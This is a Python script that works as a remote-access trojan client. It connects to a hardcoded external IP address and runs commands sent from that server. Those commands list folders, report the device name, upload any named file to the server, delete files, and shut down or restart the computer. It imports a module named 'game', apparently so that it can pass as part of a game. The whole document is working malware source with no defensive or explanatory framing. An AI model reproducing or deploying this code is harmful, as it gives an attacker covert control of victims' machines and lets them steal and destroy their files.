import socket
import os
import game

s = socket.socket()
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
port = 8080
host =  '159.203.21.223'
s.connect((host,port))


print("")
print("Connected to the server successfully")
print("")

while True:
    command = s.recv(1024)
    command = command.decode()
    print("")
    print("Command recived")
    print("")
    if command == "view_cwd":
        files = os.getcwd()
        files = str(files)
        s.send("".encode())
        s.send(files.encode())
        print("")
        print("Command has been excuted successfully")

    elif command == "custom_dir":
        user_input = s.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        s.send(files.encode())
        print("")
        print("Command has been excuted successfully")
        print("")

    elif command == "device_name":
        n = socket.gethostname().encode()
        s.send(n)
        print("")
        print("Command has been excuted successfully")
        print("")

    elif command == "download_file":
        file_path = s.recv(5000)
        file_path = file_path.decode()
        file = open(file_path, "rb")
        data = file.read()
        s.send(data)
        print("")
        print("Files has been sent successfully")
        print("")
    
    elif command == "remove_file":
        filendir = s.recv(6000)
        filendir = filendir.decode()
        os.remove(filendir)
        print("")
        print("Command has been excuted successfully")
        print("")
    
    elif command == "close":
        s.close()

    elif command == "turnoff":
        os.system("shutdown /s /t 1")
    
    elif command == "restart":
        os.system("shutdown /r /t 1")
    
    else:
        print("")
        print("Command not recognised")

